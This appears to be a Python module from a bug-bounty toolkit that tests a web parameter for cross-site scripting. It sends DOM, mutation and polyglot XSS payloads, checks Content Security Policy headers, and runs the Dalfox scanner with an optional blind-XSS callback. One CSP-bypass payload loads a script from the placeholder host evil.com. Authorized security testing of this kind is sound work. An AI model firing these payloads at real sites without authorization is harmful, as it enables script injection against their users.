"""XSS vulnerability testing — 2026 techniques."""

import json
import os
import re
import subprocess
import time
from pathlib import Path
from typing import Optional, List, Dict, Any
from dataclasses import dataclass, field

import httpx
import tenacity

from bountykit.utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class XSSFinding:
    """Single XSS finding."""
    category: str
    severity: str
    title: str
    description: str
    evidence: str = ""
    endpoint: str = ""
    payload: str = ""
    remediation: str = ""


@dataclass
class XSSResult:
    """Complete XSS assessment result."""
    target: str
    findings: List[XSSFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    timestamp: float = field(default_factory=time.time)

    @property
    def summary(self) -> Dict[str, int]:
        severity_counts: Dict[str, int] = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        return severity_counts


# 2026 XSS Techniques
XSS_2026_TECHNIQUES = [
    {
        "id": "dom_xss",
        "name": "DOM-Based XSS",
        "description": "XSS via client-side JavaScript manipulation",
        "payloads": [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "'-alert(1)-'",
        ],
    },
    {
        "id": "mutation_xss",
        "name": "Mutation XSS",
        "description": "XSS via HTML mutation and browser parsing quirks",
        "payloads": [
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
        ],
    },
    {
        "id": "csp_bypass",
        "name": "CSP Bypass XSS",
        "description": "XSS via Content Security Policy bypass",
        "payloads": [
            '<script nonce="random">alert(1)</script>',
            '<link rel=preload href=//evil.com/script.js as=script>',
        ],
    },
    {
        "id": "polyglot",
        "name": "Polyglot XSS",
        "description": "XSS payloads that work across multiple contexts",
        "payloads": [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//',
            '"><img src=x onerror=alert(1)//',
            "';alert(1)//",
        ],
    },
]


def test_xss(
    target: str,
    param: str = "q",
    output_dir: str = "./results",
    techniques: List[str] = None,
) -> XSSResult:
    """Test for XSS vulnerabilities with 2026 techniques.

    Args:
        target: Target URL with parameter
        param: Parameter to test
        output_dir: Output directory
        techniques: Specific techniques to test (None = all)
    """
    result = XSSResult(target=target)
    os.makedirs(output_dir, exist_ok=True)

    logger.info(f"Testing XSS on {target}")

    with httpx.Client(
        timeout=30.0,
        follow_redirects=True,
        headers={"User-Agent": "bountykit/0.1 (authorized research)"},
    ) as client:
        # Test DOM XSS
        if techniques is None or "dom_xss" in techniques:
            _test_dom_xss(client, target, param, result)
        
        # Test Mutation XSS
        if techniques is None or "mutation_xss" in techniques:
            _test_mutation_xss(client, target, param, result)
        
        # Test CSP Bypass
        if techniques is None or "csp_bypass" in techniques:
            _test_csp_bypass(client, target, param, result)
        
        # Test Polyglot payloads
        if techniques is None or "polyglot" in techniques:
            _test_polyglot_xss(client, target, param, result)

    # Save results
    output_file = Path(output_dir) / "xss_results.json"
    _save_results(result, output_file)

    return result


def _test_dom_xss(client: httpx.Client, target: str, param: str, result: XSSResult):
    """Test for DOM-based XSS."""
    logger.info("Testing DOM XSS...")
    
    dom_payloads = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
    ]
    
    base_url = target.rstrip("/")
    
    for payload in dom_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Check if payload is reflected
            if payload in resp.text:
                # Check for DOM manipulation patterns
                dom_patterns = [
                    r'document\.write',
                    r'innerHTML',
                    r'eval\(',
                    r'setTimeout\(',
                    r'location\.hash',
                    r'document\.URL',
                ]
                
                has_dom_sink = any(re.search(pattern, resp.text) for pattern in dom_patterns)
                
                severity = "high" if has_dom_sink else "medium"
                
                result.findings.append(XSSFinding(
                    category="xss",
                    severity=severity,
                    title=f"DOM XSS: Payload reflected in response",
                    description=f"Payload reflected with DOM sink detected" if has_dom_sink else "Payload reflected without obvious DOM sink",
                    endpoint=url,
                    payload=payload,
                    remediation="Sanitize user input, use DOMPurify for client-side rendering",
                ))
        except Exception:
            continue


def _test_mutation_xss(client: httpx.Client, target: str, param: str, result: XSSResult):
    """Test for Mutation XSS."""
    logger.info("Testing Mutation XSS...")
    
    mutation_payloads = [
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
        '<select><noembed></select><img src=x onerror=alert(1)>',
        '<listing><img src=x onerror=alert(1)>',
    ]
    
    base_url = target.rstrip("/")
    
    for payload in mutation_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Mutation XSS often transforms the payload
            if 'onerror=alert(1)' in resp.text or 'onload=alert(1)' in resp.text:
                result.findings.append(XSSFinding(
                    category="xss",
                    severity="critical",
                    title="Mutation XSS Vulnerability",
                    description="Browser mutation created executable payload",
                    endpoint=url,
                    payload=payload[:100],
                    remediation="Use proper HTML parsing and sanitization",
                ))
        except Exception:
            continue


def _test_csp_bypass(client: httpx.Client, target: str, param: str, result: XSSResult):
    """Test for CSP bypass vulnerabilities."""
    logger.info("Testing CSP bypass...")
    
    try:
        url = f"https://{target}"
        resp = client.get(url)
        
        csp_header = resp.headers.get("content-security-policy", "")
        
        if not csp_header:
            result.findings.append(XSSFinding(
                category="xss",
                severity="medium",
                title="No Content Security Policy",
                description="Target does not implement CSP",
                endpoint=url,
                remediation="Implement Content Security Policy",
            ))
            return
        
        # Check for weak CSP directives
        weak_directives = [
            ("unsafe-inline", "Allows inline scripts"),
            ("unsafe-eval", "Allows eval()"),
            ("*", "Wildcard allows any source"),
            ("data:", "Allows data: URIs"),
        ]
        
        for directive, description in weak_directives:
            if directive in csp_header:
                result.findings.append(XSSFinding(
                    category="xss",
                    severity="medium",
                    title=f"Weak CSP: {directive}",
                    description=description,
                    endpoint=url,
                    remediation=f"Remove {directive} from CSP directive",
                ))
    except Exception as e:
        logger.debug(f"CSP check failed: {e}")


def _test_polyglot_xss(client: httpx.Client, target: str, param: str, result: XSSResult):
    """Test polyglot XSS payloads."""
    logger.info("Testing polyglot XSS...")
    
    polyglot_payloads = [
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//',
        '"><img src=x onerror=alert(1)//',
        "';alert(1)//",
        '"><svg/onload=alert(1)>',
        '"><iframe/src="javascript:alert(1)">',
    ]
    
    base_url = target.rstrip("/")
    
    for payload in polyglot_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            if payload in resp.text:
                result.findings.append(XSSFinding(
                    category="xss",
                    severity="high",
                    title="Polyglot XSS Payload Reflected",
                    description="Polyglot payload successfully reflected",
                    endpoint=url,
                    payload=payload[:100],
                    remediation="Implement proper output encoding and sanitization",
                ))
        except Exception:
            continue


def _save_results(result: XSSResult, output_file: Path):
    """Save results to JSON file."""
    data = {
        "target": result.target,
        "timestamp": result.timestamp,
        "endpoints_tested": result.endpoints_tested,
        "summary": result.summary,
        "findings": [
            {
                "category": f.category,
                "severity": f.severity,
                "title": f.title,
                "description": f.description,
                "evidence": f.evidence,
                "endpoint": f.endpoint,
                "payload": f.payload,
                "remediation": f.remediation,
            }
            for f in result.findings
        ],
    }
    
    with open(output_file, "w") as f:
        json.dump(data, f, indent=2)
    
    logger.info(f"Results saved to {output_file}")


def run_dalfox(
    url: str,
    param: str = "q",
    output_dir: str = "./results",
    blind_url: Optional[str] = None,
    techniques: Optional[str] = None,
) -> dict:
    """Run Dalfox for XSS vulnerability testing.

    Args:
        url: Target URL with parameter
        param: Parameter to test
        output_dir: Output directory
        blind_url: Blind XSS callback URL
    """
    results = {
        "target": url,
        "tool": "dalfox",
        "vulnerable": False,
        "xss_found": [],
    }

    os.makedirs(output_dir, exist_ok=True)

    cmd = [
        "dalfox", "url", url,
        "-p", param,
        "--silence",
        "--format", "json",
    ]

    if blind_url:
        cmd.extend(["--blind", blind_url])

    if techniques and techniques.lower() != "all":
        cmd.extend(["--trigger-type", techniques.lower()])

    logger.info(f"Running Dalfox XSS scan on {url} (param: {param})...")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)

        if result.returncode == 0 and result.stdout.strip():
            for line in result.stdout.splitlines():
                try:
                    data = json.loads(line)
                    if data.get("type") == "XSS" or "poc" in str(data).lower():
                        results["vulnerable"] = True
                        results["xss_found"].append({
                            "param": data.get("param", param),
                            "payload": data.get("payload", ""),
                            "poc": data.get("poc", ""),
                            "type": data.get("type", "reflected"),
                        })
                except json.JSONDecodeError:
                    if "xss" in line.lower() or "poc" in line.lower():
                        results["vulnerable"] = True
                        results["xss_found"].append({"raw": line.strip()})

        if results["vulnerable"]:
            logger.warning(f"Found {len(results['xss_found'])} XSS vulnerabilities!")
        else:
            logger.info("Dalfox: No XSS found")

    except FileNotFoundError:
        logger.error("Dalfox is not installed. Run: bountykit setup")
    except subprocess.TimeoutExpired:
        logger.warning("Dalfox scan timed out")

    # Save results
    output_file = Path(output_dir) / "dalfox_results.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

    logger.info(f"Results saved to {output_file}")
    return results
